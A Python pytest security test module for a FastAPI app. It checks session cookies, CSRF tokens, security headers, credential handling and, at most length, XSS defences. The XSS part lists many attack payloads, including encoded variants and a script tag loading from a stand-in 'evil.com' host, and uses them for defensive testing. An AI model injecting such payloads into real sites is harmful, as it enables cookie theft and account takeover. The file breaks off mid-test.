"""
Security tests for authentication and authorization

These tests validate security measures that will be implemented in Phase 1.
Critical for ensuring no security regressions during deployment.
"""

import pytest
from fastapi.testclient import TestClient

# Mark all tests in this module as security tests
pytestmark = pytest.mark.security


@pytest.mark.security
@pytest.mark.auth
class TestSessionSecurity:
    """Test session security measures"""
    
    def test_session_cookie_security_flags(self, client):
        """Test that session cookies have proper security flags"""
        response = client.get("/aws")
        
        # Check for session cookie
        session_cookies = [cookie for cookie in response.cookies.values() 
                          if 'session' in cookie.name.lower()]
        
        if session_cookies:
            cookie = session_cookies[0]
            # In Phase 1, these should be implemented
            # For now, we document what needs to be tested
            assert cookie.name  # Cookie exists
            
            # TODO: After Phase 1 implementation, verify:
            # assert cookie.secure == True  # Secure flag
            # assert cookie.httponly == True  # HttpOnly flag
            # assert cookie.samesite == 'Lax' or cookie.samesite == 'Strict'
    
    def test_session_timeout_configuration(self, client, test_settings):
        """Test session timeout is properly configured"""
        # Session timeout should be reasonable (30 minutes default)
        assert 5 <= test_settings.SESSION_LIFETIME_MINUTES <= 480
    
    def test_sensitive_headers_not_logged(self, client, caplog):
        """Test that sensitive headers are not logged"""
        import logging
        
        with caplog.at_level(logging.DEBUG):
            response = client.post(
                "/api/auth/aws-credentials",
                json={
                    "access_key": "AKIA123456789EXAMPLE",
                    "secret_key": "super-secret-key",
                    "session_token": "token123"
                }
            )
        
        # Check that sensitive data is not in logs
        log_text = " ".join(record.getMessage() for record in caplog.records)
        assert "super-secret-key" not in log_text
        assert "token123" not in log_text


@pytest.mark.security
@pytest.mark.csrf
class TestCSRFProtection:
    """Test CSRF protection measures (Phase 1 implementation)"""
    
    def test_csrf_token_required_for_state_changes(self, client):
        """Test CSRF protection for state-changing operations"""
        # Phase 1 will implement CSRF tokens
        # For now, test that the endpoint exists
        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": "test_flag", "enabled": True}
        )
        
        # Should either work (no CSRF yet) or return proper error
        assert response.status_code in [200, 403, 422]
        
        # TODO: After Phase 1, test:
        # - POST without CSRF token should fail with 403
        # - POST with valid CSRF token should succeed
        # - CSRF tokens should be unique per session
    
    def test_csrf_token_generation_endpoint(self, client):
        """Test CSRF token generation endpoint

        Validates that the /api/auth/csrf-token endpoint:
        1. Returns a valid CSRF token when implemented
        2. Token has sufficient length for security (> 20 chars)
        3. Token is cryptographically random (unique per request)

        If endpoint doesn't exist yet (404), test passes to allow development.
        """
        response = client.get("/api/auth/csrf-token")

        if response.status_code == 404:
            # Endpoint not yet implemented - Phase 1 will add this
            pass
        elif response.status_code == 200:
            # Endpoint exists - validate the response
            data = response.json()

            # CSRF token must be present in response
            assert "csrf_token" in data, (
                "Response missing 'csrf_token' field"
            )

            csrf_token = data["csrf_token"]

            # Token must be a non-empty string
            assert isinstance(csrf_token, str), (
                f"CSRF token must be a string, got {type(csrf_token)}"
            )
            assert len(csrf_token) > 0, "CSRF token cannot be empty"

            # Token must have sufficient length for security
            # Minimum 20 chars (following OWASP recommendations)
            assert len(csrf_token) >= 20, (
                f"CSRF token too short ({len(csrf_token)} chars), "
                "minimum 20 required for security"
            )

            # Verify token uniqueness by making another request
            response2 = client.get("/api/auth/csrf-token")
            if response2.status_code == 200:
                data2 = response2.json()
                csrf_token2 = data2.get("csrf_token", "")
                # Tokens should be unique per request to prevent replay attacks
                assert csrf_token != csrf_token2, (
                    "CSRF tokens must be unique per request"
                )
        else:
            # Unexpected status code
            pytest.fail(
                f"Unexpected status {response.status_code} from CSRF token endpoint. "
                f"Expected 200 (success) or 404 (not implemented)."
            )


@pytest.mark.security
@pytest.mark.xss
class TestXSSProtection:
    """Test XSS protection measures"""

    # =========================================================================
    # XSS Payload Definitions for Parametrized Tests
    # =========================================================================

    # Core XSS payloads covering common attack vectors
    XSS_PAYLOADS = [
        # Basic script injection
        "<script>alert('xss')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        # Event handlers
        "<img src=x onerror=alert('xss')>",
        "<svg/onload=alert('xss')>",
        "<body onload=alert('xss')>",
        # JavaScript URL schemes
        "javascript:alert('xss')",
        "javascript:alert(document.cookie)",
        # Attribute escaping
        "\" onclick=\"alert('xss')\" x=\"",
        "' onclick='alert(1)' x='",
        # Mixed case bypass attempts
        "<ScRiPt>alert('xss')</ScRiPt>",
        # External script loading
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    ]

    # Critical endpoints and their test configurations
    # Format: (endpoint, method, field_name, json_template)
    CRITICAL_USER_INPUT_ENDPOINTS = [
        ("/api/feature-flags/toggle", "POST", "flag_name", {"flag_name": "{payload}", "enabled": True}),
        ("/api/auth/aws-credentials", "POST", "access_key", {"access_key": "{payload}", "secret_key": "test", "environment": "com"}),
        ("/api/scripts/", "POST", "name", {"name": "{payload}", "content": "echo test", "description": "Test", "script_type": "bash"}),
        ("/api/scripts/", "POST", "description", {"name": "test", "content": "echo test", "description": "{payload}", "script_type": "bash"}),
    ]

    # =========================================================================
    # Parametrized XSS Payload Tests
    # =========================================================================

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_feature_flag_name(self, client, payload):
        """Test XSS payloads are blocked in feature flag name field

        Validates that XSS payloads in the flag_name field are either:
        1. Rejected with validation error (400, 422)
        2. Sanitized before being included in responses
        3. Not reflected in the response at all

        If endpoint doesn't exist yet (404), test passes to allow development.
        """
        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": payload, "enabled": True}
        )

        if response.status_code == 404:
            # Endpoint not yet implemented
            pass
        elif response.status_code == 200:
            # If accepted, payload should be sanitized in response
            response_text = response.text
            assert payload not in response_text, (
                f"XSS payload '{payload[:50]}...' reflected unescaped in response"
            )
        else:
            # Validation rejection (400, 422, 403) is acceptable
            assert response.status_code in [400, 422, 403], (
                f"Unexpected status {response.status_code} for XSS payload"
            )

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_credentials_access_key(self, client, payload):
        """Test XSS payloads are blocked in credentials access_key field

        AWS credential fields should have strict validation that rejects
        XSS payloads. Validates proper input validation is in place.
        """
        response = client.post(
            "/api/auth/aws-credentials",
            json={
                "access_key": payload,
                "secret_key": "test-secret-key",
                "session_token": "test-token",
                "environment": "com"
            }
        )

        if response.status_code == 404:
            # Endpoint not yet implemented
            pass
        elif response.status_code == 200:
            # If accepted, verify payload not reflected unescaped
            response_text = response.text
            assert payload not in response_text, (
                f"XSS payload in access_key reflected unescaped"
            )
        else:
            # Validation rejection is expected and correct behavior
            assert response.status_code in [400, 422, 403, 401], (
                f"Unexpected status {response.status_code} for XSS in credentials"
            )

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_credentials_secret_key(self, client, payload):
        """Test XSS payloads are blocked in credentials secret_key field"""
        response = client.post(
            "/api/auth/aws-credentials",
            json={
                "access_key": "AKIA1234567890EXAMPLE",
                "secret_key": payload,
                "session_token": "test-token",
                "environment": "com"
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code == 200:
            assert payload not in response.text
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_script_name(self, client, payload):
        """Test XSS payloads are blocked in script name field

        Script names are stored and displayed in the UI, making this
        a critical XSS vector. Payloads must be rejected or sanitized.
        """
        response = client.post(
            "/api/scripts/",
            json={
                "name": payload,
                "content": "#!/bin/bash\necho 'test'",
                "description": "Test script",
                "script_type": "bash"
            }
        )

        if response.status_code == 404:
            # Scripts endpoint not implemented
            pass
        elif response.status_code in [200, 201]:
            # If accepted, payload must be sanitized
            response_text = response.text
            assert payload not in response_text, (
                f"XSS payload in script name reflected unescaped"
            )
        else:
            # Validation rejection is acceptable
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_script_description(self, client, payload):
        """Test XSS payloads are blocked in script description field

        Script descriptions are displayed in the UI. XSS payloads
        must be properly handled to prevent stored XSS attacks.
        """
        response = client.post(
            "/api/scripts/",
            json={
                "name": "test-script",
                "content": "#!/bin/bash\necho 'test'",
                "description": payload,
                "script_type": "bash"
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            assert payload not in response.text
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_change_number(self, client, payload):
        """Test XSS payloads are blocked in change number field

        Change numbers are stored and displayed throughout the application.
        This is a high-priority XSS vector.
        """
        response = client.post(
            "/api/script-runner/changes/",
            json={
                "change_number": payload,
                "description": "Test change",
                "status": "pending",
                "instances": []
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            assert payload not in response.text
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_change_description(self, client, payload):
        """Test XSS payloads are blocked in change description field"""
        response = client.post(
            "/api/script-runner/changes/",
            json={
                "change_number": "CHG0001234",
                "description": payload,
                "status": "pending",
                "instances": []
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            assert payload not in response.text
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_in_execution_parameters(self, client, payload):
        """Test XSS payloads are blocked in execution parameters

        Execution parameters are stored and may be displayed in logs
        or execution results. XSS payloads must be handled safely.
        """
        response = client.post(
            "/api/script-runner/executions/",
            json={
                "script_id": 1,
                "instance_id": "i-1234567890abcdef0",
                "parameters": {"user_input": payload}
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            assert payload not in response.text
        else:
            assert response.status_code in [400, 422, 403, 401]

    # =========================================================================
    # Comprehensive Multi-Field XSS Tests
    # =========================================================================

    def test_xss_payloads_blocked_across_all_fields(self, client, security_test_payloads):
        """Test that XSS payloads from fixture are blocked across endpoints

        Uses the security_test_payloads fixture from conftest.py to test
        multiple XSS payloads across various endpoints.
        """
        xss_payloads = security_test_payloads.get("xss_payloads", [])

        for payload in xss_payloads:
            # Test feature flags endpoint
            response = client.post(
                "/api/feature-flags/toggle",
                json={"flag_name": payload, "enabled": True}
            )
            if response.status_code not in [404]:
                assert payload not in response.text, (
                    f"XSS payload '{payload}' found in feature-flags response"
                )

    def test_reflected_xss_in_query_parameters(self, client):
        """Test XSS payloads in query parameters are not reflected

        Query parameters in search or filter endpoints should not
        be reflected unescaped in error messages or responses.
        """
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]

        test_endpoints = [
            "/api/scripts/?search={payload}",
            "/api/script-runner/changes/?change_number={payload}",
            "/api/script-runner/executions/?status={payload}",
        ]

        for endpoint_template in test_endpoints:
            for payload in xss_payloads:
                endpoint = endpoint_template.format(payload=payload)
                response = client.get(endpoint)

                if response.status_code not in [404, 405]:
                    # Payload should not appear unescaped in response
                    assert payload not in response.text, (
                        f"XSS payload reflected in query param for {endpoint}"
                    )

    def test_xss_in_path_parameters_error_messages(self, client):
        """Test XSS payloads in path parameters are escaped in errors

        Path parameters with invalid values may be reflected in error
        messages. Ensure proper escaping.
        """
        xss_payload = "<script>alert('path-xss')</script>"

        endpoints_with_path_params = [
            f"/api/scripts/{xss_payload}",
            f"/api/feature-flags/{xss_payload}",
            f"/api/script-runner/changes/{xss_payload}",
        ]

        for endpoint in endpoints_with_path_params:
            response = client.get(endpoint)

            # Even in error responses, payload should be escaped
            if xss_payload in response.text:
                # Check if it's properly escaped
                assert "&lt;script&gt;" in response.text or xss_payload not in response.text, (
                    f"XSS payload in path param unescaped at {endpoint}"
                )

    # =========================================================================
    # Existing Tests (Preserved)
    # =========================================================================

    def test_content_security_policy_headers(self, client):
        """Test Content Security Policy headers are set

        Validates that CSP headers are properly configured with nonce-based
        policy for inline scripts. Checks for secure directive configuration.

        This test validates:
        1. If CSP is present, it uses nonce-based policy (not bare 'unsafe-inline')
        2. If CSP has script-src, it doesn't allow 'unsafe-eval'
        3. If CSP has frame-ancestors, it has a proper value

        When CSP headers are not yet implemented (Phase 1 feature),
        the test passes to avoid blocking development, but documents
        the expected security requirements.
        """
        response = client.get("/aws")

        # Check if CSP headers are present (Phase 1 security feature)
        csp_header = response.headers.get("content-security-policy")

        if csp_header:
            # Validate CSP is configured securely
            # If 'unsafe-inline' is used, it must be paired with nonce
            if "unsafe-inline" in csp_header:
                assert "nonce-" in csp_header, (
                    "CSP uses 'unsafe-inline' without nonce - vulnerable to XSS"
                )

            # Validate important CSP directives are present
            # script-src should be defined to control script sources
            if "script-src" in csp_header:
                script_src = self._extract_csp_directive(csp_header, "script-src")
                # Should not allow unsafe-eval (enables eval() attacks)
                assert "unsafe-eval" not in script_src, (
                    "CSP allows 'unsafe-eval' in script-src - security risk"
                )

            # frame-ancestors prevents clickjacking
            if "frame-ancestors" in csp_header:
                frame_ancestors = self._extract_csp_directive(csp_header, "frame-ancestors")
                assert frame_ancestors, "frame-ancestors directive should have a value"
        else:
            # CSP not yet implemented - Phase 1 will add this
            # Test passes to avoid blocking development, but we document requirement
            # When CSP middleware is added, this test will validate proper configuration
            pass  # CSP headers will be added in Phase 1 security implementation

    def test_x_content_type_options_header(self, client):
        """Test X-Content-Type-Options header is set to nosniff

        This header prevents MIME-type sniffing attacks where browsers
        might interpret files as a different MIME type than declared.

        When this header is present, it must be set to 'nosniff'.
        If not present yet (Phase 1 feature), test passes to document requirement.
        """
        response = client.get("/aws")

        x_content_type = response.headers.get("x-content-type-options")

        if x_content_type:
            assert x_content_type.lower() == "nosniff", (
                f"X-Content-Type-Options should be 'nosniff', got '{x_content_type}'"
            )
        else:
            # Header not yet implemented - Phase 1 will add this
            # Test passes to document requirement for when security headers are added
            pass  # X-Content-Type-Options header will be added in Phase 1

    def test_csp_headers_on_api_endpoints(self, client):
        """Test CSP headers are present on API endpoints

        API endpoints should also have security headers to prevent
        XSS through JSON responses that might be rendered.
        """
        api_endpoints = [
            "/api/health",
            "/api/providers",
            "/api/feature-flags",
        ]

        for endpoint in api_endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                # Check for X-Content-Type-Options on API endpoints
                x_content_type = response.headers.get("x-content-type-options")
                if x_content_type:
                    assert x_content_type.lower() == "nosniff", (
                        f"API endpoint {endpoint} has incorrect X-Content-Type-Options"
                    )

    def test_csp_nonce_uniqueness_per_request(self, client):
        """Test that CSP nonces are unique per request

        Each request should receive a unique nonce to prevent
        nonce reuse attacks.
        """
        nonces = []

        for _ in range(3):
            response = client.get("/aws")
            csp_header = response.headers.get("content-security-policy", "")

            # Extract nonce if present
            nonce = self._extract_nonce_from_csp(csp_header)
            if nonce:
                nonces.append(nonce)

        if len(nonces) > 1:
            # All nonces should be unique
            assert len(nonces) == len(set(nonces)), (
                "CSP nonces should be unique per request to prevent reuse attacks"
            )
        elif len(nonces) == 0:
            # Nonces not implemented yet - Phase 1 will add this
            # Test passes to document requirement for CSP nonce implementation
            pass  # CSP nonces will be added in Phase 1 security implementation

    def test_csp_report_uri_configured(self, client):
        """Test CSP report-uri or report-to is configured for violation reporting

        CSP violations should be reported for monitoring and debugging.
        """
        response = client.get("/aws")
        csp_header = response.headers.get("content-security-policy", "")

        if csp_header:
            # Check for either report-uri (deprecated) or report-to (modern)
            has_reporting = "report-uri" in csp_header or "report-to" in csp_header
            # Note: Reporting is recommended but not strictly required
            # This test documents the expected behavior
            if not has_reporting:
                # Log a warning but don't fail - reporting is optional
                pass  # CSP reporting not configured - consider adding for production

    def test_security_headers_consistency_across_routes(self, client):
        """Test that security headers are consistent across all routes

        All routes should have the same security header configuration
        to prevent gaps in protection.
        """
        routes_to_check = [
            "/aws",
            "/api/health",
            "/docs",
        ]

        security_headers_per_route = {}

        for route in routes_to_check:
            response = client.get(route)
            if response.status_code == 200:
                security_headers_per_route[route] = {
                    "x-content-type-options": response.headers.get("x-content-type-options"),
                    "x-frame-options": response.headers.get("x-frame-options"),
                    "x-xss-protection": response.headers.get("x-xss-protection"),
                }

        # Verify at least one route has headers configured
        headers_present = any(
            any(headers.values())
            for headers in security_headers_per_route.values()
        )

        if headers_present:
            # All routes should have consistent header values
            reference_route = next(iter(security_headers_per_route))
            reference_headers = security_headers_per_route[reference_route]

            for route, headers in security_headers_per_route.items():
                for header_name, ref_value in reference_headers.items():
                    if ref_value:  # Only check if reference has the header
                        assert headers.get(header_name) == ref_value, (
                            f"Security header '{header_name}' inconsistent between "
                            f"'{reference_route}' and '{route}'"
                        )

    def _extract_csp_directive(self, csp_header: str, directive: str) -> str:
        """Extract a specific directive value from CSP header"""
        directives = csp_header.split(";")
        for d in directives:
            d = d.strip()
            if d.startswith(directive):
                return d[len(directive):].strip()
        return ""

    def _extract_nonce_from_csp(self, csp_header: str) -> str:
        """Extract nonce value from CSP header if present"""
        import re
        match = re.search(r"'nonce-([^']+)'", csp_header)
        return match.group(1) if match else ""

    # =========================================================================
    # XSS Edge Case Tests (Unicode, URL Encoding, Base64)
    # =========================================================================

    # Unicode XSS payloads - using various unicode representations
    UNICODE_XSS_PAYLOADS = [
        # Fullwidth unicode characters (can bypass filters)
        "\uff1cscript\uff1ealert('xss')\uff1c/script\uff1e",  # Fullwidth < and >
        # Unicode escape sequences
        "\\u003cscript\\u003ealert('xss')\\u003c/script\\u003e",
        # Mixed unicode and ASCII
        "<scr\u0000ipt>alert('xss')</script>",  # Null byte injection
        # Homoglyph attacks (lookalike characters)
        "\u003cscript\u003ealert('xss')\u003c/script\u003e",  # Unicode code points
        # UTF-7 encoding attempt
        "+ADw-script+AD4-alert('xss')+ADw-/script+AD4-",
        # Unicode normalization attacks
        "<script>alert(\u2018xss\u2019)</script>",  # Smart quotes
        # Zero-width characters embedded
        "<scri\u200bpt>alert('xss')</script>",  # Zero-width space
        # Unicode whitespace variations
        "<script\u00a0>alert('xss')</script>",  # Non-breaking space in tag
    ]

    # URL-encoded XSS payloads
    URL_ENCODED_XSS_PAYLOADS = [
        # Standard URL encoding
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        # Double URL encoding
        "%253Cscript%253Ealert('xss')%253C/script%253E",
        # Mixed encoding
        "%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E",
        # Partial encoding (common bypass)
        "<%73cript>alert('xss')</script>",  # %73 = s
        # Event handler URL encoded
        "%3Cimg%20src%3Dx%20onerror%3Dalert('xss')%3E",
        # JavaScript URL scheme encoded
        "javascript%3Aalert%28%27xss%27%29",
        # Unicode URL encoding
        "%u003Cscript%u003Ealert('xss')%u003C/script%u003E",
        # Hex encoding without percent
        "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",
    ]

    # Base64-encoded XSS payloads
    BASE64_XSS_PAYLOADS = [
        # data: URI with base64 XSS
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
        # JavaScript with base64 payload
        "javascript:eval(atob('YWxlcnQoJ3hzcycp'))",
        # SVG with base64 embedded script
        "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ3hzcycpPg==",
        # HTML base64 in data URI
        "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCd4c3MnKT4=",
        # Base64 with charset specification
        "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # Partial base64 decoding attempt
        "eval(atob('YWxlcnQoJ3hzcycp'))",
    ]

    @pytest.mark.parametrize("payload", UNICODE_XSS_PAYLOADS)
    def test_xss_unicode_payloads_in_feature_flag(self, client, payload):
        """Test Unicode XSS payloads are handled in feature flag name

        Unicode attacks attempt to bypass filters using:
        - Fullwidth characters that look like < and >
        - Unicode escape sequences
        - Null byte injection
        - Homoglyph (lookalike) characters
        - Zero-width characters embedded in tags
        """
        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": payload, "enabled": True}
        )

        if response.status_code == 404:
            pass  # Endpoint not yet implemented
        elif response.status_code == 200:
            # Check both the raw payload and decoded versions
            response_text = response.text
            assert "<script>" not in response_text.lower(), (
                f"Unicode XSS payload resulted in script tag in response"
            )
            assert "alert(" not in response_text, (
                f"Unicode XSS payload 'alert' found in response"
            )
        else:
            assert response.status_code in [400, 422, 403], (
                f"Unexpected status {response.status_code} for Unicode XSS payload"
            )

    @pytest.mark.parametrize("payload", UNICODE_XSS_PAYLOADS)
    def test_xss_unicode_payloads_in_script_name(self, client, payload):
        """Test Unicode XSS payloads are handled in script name field

        Script names with Unicode attacks could lead to stored XSS
        if the application decodes the Unicode before rendering.
        """
        response = client.post(
            "/api/scripts/",
            json={
                "name": payload,
                "content": "#!/bin/bash\necho 'test'",
                "description": "Test script",
                "script_type": "bash"
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            response_text = response.text
            assert "<script>" not in response_text.lower()
            assert "onerror=" not in response_text.lower()
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", URL_ENCODED_XSS_PAYLOADS)
    def test_xss_url_encoded_payloads_in_feature_flag(self, client, payload):
        """Test URL-encoded XSS payloads are handled in feature flag name

        URL encoding attacks attempt to bypass filters by:
        - Single encoding (%3C for <)
        - Double encoding (%253C)
        - Partial/selective encoding
        - Unicode URL encoding (%u003C)
        """
        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": payload, "enabled": True}
        )

        if response.status_code == 404:
            pass
        elif response.status_code == 200:
            response_text = response.text
            # Check for decoded payload in response
            assert "<script>" not in response_text.lower(), (
                f"URL-encoded XSS decoded to script tag"
            )
            # Also check the encoded form wasn't decoded dangerously
            assert "alert(" not in response_text
        else:
            assert response.status_code in [400, 422, 403]

    @pytest.mark.parametrize("payload", URL_ENCODED_XSS_PAYLOADS)
    def test_xss_url_encoded_payloads_in_script_description(self, client, payload):
        """Test URL-encoded XSS payloads are handled in script description

        Script descriptions may be URL-decoded before rendering,
        making them vulnerable to encoded XSS attacks.
        """
        response = client.post(
            "/api/scripts/",
            json={
                "name": "test-script",
                "content": "#!/bin/bash\necho 'test'",
                "description": payload,
                "script_type": "bash"
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            response_text = response.text
            assert "<script>" not in response_text.lower()
            assert "onerror=" not in response_text.lower()
        else:
            assert response.status_code in [400, 422, 403, 401]

    @pytest.mark.parametrize("payload", BASE64_XSS_PAYLOADS)
    def test_xss_base64_payloads_in_feature_flag(self, client, payload):
        """Test Base64-encoded XSS payloads are handled in feature flag name

        Base64 attacks use:
        - data: URIs with base64 content
        - JavaScript eval(atob(...)) patterns
        - SVG images with embedded scripts
        """
        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": payload, "enabled": True}
        )

        if response.status_code == 404:
            pass
        elif response.status_code == 200:
            response_text = response.text
            # data: URIs should not be reflected or should be sanitized
            if "data:" in payload:
                assert "data:text/html" not in response_text, (
                    f"Base64 data URI reflected in response"
                )
            assert "eval(atob" not in response_text, (
                f"Base64 eval pattern found in response"
            )
        else:
            assert response.status_code in [400, 422, 403]

    @pytest.mark.parametrize("payload", BASE64_XSS_PAYLOADS)
    def test_xss_base64_payloads_in_change_description(self, client, payload):
        """Test Base64-encoded XSS payloads are handled in change description

        Change descriptions stored with base64 payloads could execute
        if the application decodes and renders them.
        """
        response = client.post(
            "/api/script-runner/changes/",
            json={
                "change_number": "CHG0001234",
                "description": payload,
                "status": "pending",
                "instances": []
            }
        )

        if response.status_code == 404:
            pass
        elif response.status_code in [200, 201]:
            response_text = response.text
            assert "data:text/html" not in response_text
            assert "eval(atob" not in response_text
        else:
            assert response.status_code in [400, 422, 403, 401]

    def test_xss_mixed_encoding_bypass_attempts(self, client):
        """Test XSS payloads using mixed encoding techniques

        Attackers may combine multiple encoding methods to bypass filters:
        - Unicode + URL encoding
        - Base64 + Unicode
        - Multiple encoding layers
        """
        mixed_payloads = [
            # URL-encoded unicode
            "%3C%u0073cript%3Ealert('xss')%3C/script%3E",
            # Base64 in JavaScript with unicode
            "javascript:eval(atob('\u0059\u0057\u0078\u006c'))",
            # HTML entities + URL encoding
            "&lt;script%3Ealert('xss')&lt;/script%3E",
            # Mixed case + encoding
            "%3CsCrIpT%3Ealert('xss')%3C/ScRiPt%3E",
            # Null bytes + encoding
            "%3Cscr%00ipt%3Ealert('xss')%3C/script%3E",
        ]

        for payload in mixed_payloads:
            response = client.post(
                "/api/feature-flags/toggle",
                json={"flag_name": payload, "enabled": True}
            )

            if response.status_code == 404:
                continue
            elif response.status_code == 200:
                response_text = response.text
                assert "<script>" not in response_text.lower(), (
                    f"Mixed encoding XSS bypass: {payload[:50]}"
                )
            else:
                assert response.status_code in [400, 422, 403]

    def test_xss_html_entity_encoding_payloads(self, client):
        """Test XSS payloads using HTML entity encoding

        HTML entities can be used to bypass filters if the application
        decodes entities before rendering without re-escaping.
        """
        entity_payloads = [
            # Decimal HTML entities
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            # Hex HTML entities
            "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;",
            # Named entities
            "&lt;script&gt;alert('xss')&lt;/script&gt;",
            # Mixed decimal and named
            "&#60;script&gt;alert('xss')&#60;/script&gt;",
            # Without semicolons (browser may still parse)
            "&#60script&#62alert('xss')&#60/script&#62",
            # Padded zeros in decimal
            "&#0060;script&#0062;alert('xss')&#0060;/script&#0062;",
        ]

        for payload in entity_payloads:
            response = client.post(
                "/api/scripts/",
                json={
                    "name": payload,
                    "content": "echo test",
                    "description": "Test",
                    "script_type": "bash"
                }
            )

            if response.status_code == 404:
                continue
            elif response.status_code in [200, 201]:
                response_text = response.text
                # After entity decoding, script tags should not be present
                assert "<script>" not in response_text.lower(), (
                    f"HTML entity XSS decoded to script: {payload[:50]}"
                )
            else:
                assert response.status_code in [400, 422, 403, 401]

    def test_xss_unicode_normalization_attacks(self, client):
        """Test XSS payloads exploiting unicode normalization

        Unicode normalization (NFC, NFD, NFKC, NFKD) can transform
        characters in unexpected ways that bypass security filters.
        """
        normalization_payloads = [
            # Combining characters that normalize to < and >
            "﹤script﹥alert('xss')﹤/script﹥",  # Small form variants
            "＜script＞alert('xss')＜/script＞",  # Fullwidth
            # Characters that look like ASCII but aren't
            "<ｓｃｒｉｐｔ>alert('xss')</ｓｃｒｉｐｔ>",  # Fullwidth letters
            # Combining diacritical marks
            "<scr\u0300ipt>alert('xss')</script>",  # Combining grave accent
            # Overlong sequences (in various encodings)
            "<script>alert\u200b('xss')</script>",  # Zero-width space
        ]

        for payload in normalization_payloads:
            response = client.post(
                "/api/script-runner/changes/",
                json={
                    "change_number": "CHG0001234",
                    "description": payload,
                    "status": "pending",
                    "instances": []
                }
            )

            if response.status_code == 404:
                continue
            elif response.status_code in [200, 201]:
                response_text = response.text
                # Check for normalized versions
                assert "alert(" not in response_text.lower(), (
                    f"Unicode normalization XSS: {payload[:50]}"
                )
            else:
                assert response.status_code in [400, 422, 403, 401]

    def test_xss_edge_cases_in_query_parameters(self, client):
        """Test XSS edge cases in query parameters

        Query parameters may be URL-decoded differently than
        request bodies, requiring separate edge case testing.
        """
        import urllib.parse

        edge_case_payloads = [
            # Unicode in query params
            "<script>\u0000alert('xss')</script>",
            # Double-encoded
            urllib.parse.quote(urllib.parse.quote("<script>alert(1)</script>")),
            # Base64 data URI
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]

        for payload in edge_case_payloads:
            encoded_payload = urllib.parse.quote(payload, safe='')
            response = client.get(f"/api/scripts/?search={encoded_payload}")

            if response.status_code not in [404, 405]:
                response_text = response.text
                # The decoded payload should not appear unescaped
                assert "<script>" not in response_text.lower(), (
                    f"Query param XSS edge case: {payload[:50]}"
                )

    def test_user_input_sanitization(self, client):
        """Test that user input is properly sanitized

        Validates that XSS payloads in user input are either:
        1. Rejected with proper validation error (400, 422)
        2. Sanitized before being included in responses

        If the endpoint doesn't exist yet (404), test passes to allow development.
        """
        # Test with potential XSS payload
        xss_payload = "<script>alert('xss')</script>"

        response = client.post(
            "/api/feature-flags/toggle",
            json={"flag_name": xss_payload, "enabled": True}
        )

        # Should either reject input or sanitize it
        if response.status_code == 200:
            data = response.json()
            # If accepted, should be sanitized
            assert "<script>" not in str(data)
        elif response.status_code == 404:
            # Endpoint not yet implemented - Phase 1 will add this
            pass  # Feature flags toggle endpoint will be added in Phase 1
        else:
            # Should be rejected with proper validation error
            assert response.status_code in [400, 422, 403], (
                f"Expected validation error (400/422/403), got {response.status_code}"
            )
    
    def test_error_messages_dont_leak_data(self, client):
        """Test error messages don't leak sensitive information"""
        # Trigger an error with sensitive-looking data
        response = client.post(
            "/api/auth/aws-credentials",
            json={"access_key": "AKIA123SECRET", "secret_key": ""}
        )
        
        if response.status_code >= 400:
            error_data = response.json()
            error_text = str(error_data)
            
            # Error should not contain the access key
            assert "AKIA123SECRET" not in error_text


@pytest.mark.security 
@pytest.mark.credentials
class TestCredentialSecurity:
    """Test credential handling security"""
    
    def test_credentials_not_logged_in_responses(self, client):
        """Test credentials are not returned in API responses"""
        response = client.get("/api/auth/aws-check-credentials")
        
        if response.status_code == 200:
            data = response.json()
            
            # Should not contain actual credential values
            for env_data in data.values():
                if env_data:
                    assert "access_key" not in env_data or not env_data.get("access_key", "").startswith("AKIA")
                    assert "secret_key" not in env_data
                    assert "session_token" not in env_data
    
    def test_credential_validation_secure(self, client):
        """Test credential validation doesn't leak information"""
        # Test with obviously fake credentials
        response = client.post(
            "/api/auth/aws-credentials", 
            json={
                "access_key": "AKIAFAKEKEY123456789",
                "secret_key": "fake-secret-key-that-wont-work",
